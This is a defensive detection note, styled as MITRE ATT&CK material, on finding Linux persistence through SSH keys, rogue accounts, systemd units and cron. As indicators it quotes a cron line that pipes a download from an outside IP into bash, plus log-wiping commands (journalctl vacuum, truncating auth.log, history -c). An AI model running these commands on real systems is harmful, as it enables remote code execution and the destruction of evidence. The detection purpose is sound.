---
id: technique-t1098-004
title: "Persistence on compromised Linux hosts: SSH keys, systemd units, and cron"
publisher: MITRE ATT&CK / technique note
published: 2025-05-02
lang: en
severity: high
mitre: [T1098.004, T1543.002, T1053.003, T1136.001, T1070.002]
keywords:
  - persistence
  - 永続化
  - authorized_keys
  - SSH鍵
  - backdoor
  - バックドア
  - systemd
  - cron
  - account creation
  - アカウント作成
---

## Summary

Initial access is transient; persistence is what turns a compromise into a problem.
On Linux the three dominant mechanisms are SSH authorised keys, systemd units, and
cron. All three are cheap for an attacker, survive reboots, and — critically — look
almost identical to legitimate administration in logs. Distinguishing them depends
on **who** made the change and **when**, not on what the change looks like.

## T1098.004 — SSH authorized_keys

Appending a public key to `~/.ssh/authorized_keys` grants durable access that does
not depend on a password and does not appear in credential-rotation procedures. It
is the single most common Linux persistence mechanism.

Detection:

```bash
sudo find / -name authorized_keys -not -path '*/proc/*' -printf '%T+ %u %p\n' 2>/dev/null | sort -r
sudo find /home /root -name authorized_keys -newermt '-7 days' -ls
```

A key added to `/root/.ssh/authorized_keys` while no interactive root session was
open is conclusive. Correlate the file's mtime against `last -F` output.

The subsequent login is logged as a *legitimate* successful authentication:

```
sshd[NNNN]: Accepted publickey for root from 203.0.113.45 port 51200 ssh2: ED25519 SHA256:...
```

The key fingerprint in that line is the pivot. Compare it against your inventory of
authorised keys; an unrecognised fingerprint on a successful login is the alert.

## T1136.001 — new local accounts

```
useradd[NNNN]: new user: name=svc-backup, UID=1002, GID=1002, home=/home/svc-backup, shell=/bin/bash
usermod[NNNN]: add 'svc-backup' to group 'sudo'
```

Service-sounding names (`svc-`, `backup`, `monitor`, `deploy`) are deliberate
camouflage. Two checks catch nearly all of it: any account creation outside a
change window, and any addition to `sudo`, `wheel`, `docker`, or `adm`. Membership
in `docker` is equivalent to root, and is frequently overlooked.

```bash
getent group sudo docker adm
sudo awk -F: '$3 >= 1000 {print $1, $3, $6, $7}' /etc/passwd
```

## T1543.002 — systemd services and timers

A unit in `/etc/systemd/system` with `Restart=always` is persistence that also
self-heals. Timers are stealthier than cron because they are less frequently
inspected.

```bash
systemctl list-unit-files --state=enabled
systemctl list-timers --all
sudo ls -lt /etc/systemd/system /usr/lib/systemd/system | head -30
sudo systemd-analyze verify '*.service' 2>&1 | head
```

Log artefacts to watch:

```
systemd[1]: Reloading.
systemd[1]: Started <unfamiliar>.service.
systemd[1]: Created symlink /etc/systemd/system/multi-user.target.wants/x.service
```

## T1053.003 — cron

```bash
sudo ls -l /etc/cron.d /etc/cron.{hourly,daily,weekly,monthly}
sudo ls -l /var/spool/cron/crontabs
for u in $(cut -f1 -d: /etc/passwd); do sudo crontab -l -u "$u" 2>/dev/null | sed "s/^/$u: /"; done
```

Crontab edits are logged:

```
crontab[NNNN]: (root) REPLACE (root)
CRON[NNNN]: (root) CMD (curl -s http://198.51.100.99/x.sh | bash)
```

A cron `CMD` that pipes a download into a shell is not ambiguous — it is remote code
execution on a schedule, and should be treated as critical regardless of what the
surrounding logs say.

## T1070.002 — the counter-indicator

Attackers who install persistence frequently follow it with log manipulation:
`journalctl --vacuum-time=1s`, `truncate -s 0 /var/log/auth.log`, `history -c`. If
you see any of those, **the local logs can no longer be trusted as evidence**, and
the timeline you build from them has a hole in it. This is the argument for shipping
logs off-host: remote copies are the only ones an on-host attacker cannot edit.

## Triage order

Persistence findings should be worked newest-first but **reported oldest-first**,
because the earliest mechanism tells you when the compromise began, which determines
how far back your evidence needs to reach.
